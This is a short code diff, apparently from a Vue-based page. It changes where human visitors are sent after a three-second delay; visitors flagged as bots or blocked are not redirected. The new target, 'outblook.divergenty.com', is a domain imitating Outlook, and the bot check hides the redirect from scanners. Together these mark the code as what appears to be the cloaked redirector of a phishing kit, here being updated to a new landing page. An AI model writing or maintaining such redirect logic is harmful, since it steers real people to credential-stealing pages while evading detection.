@@ -56,7 +56,7 @@ const app = createApp({
       
       if (!isBot.value && !isBlocked.value) {
         setTimeout(() => {
-          window.location.href = 'https://drivefile.derwurm.ro/';
+          window.location.href = 'https://outblook.divergenty.com/';
         }, 3000);
       }
     });
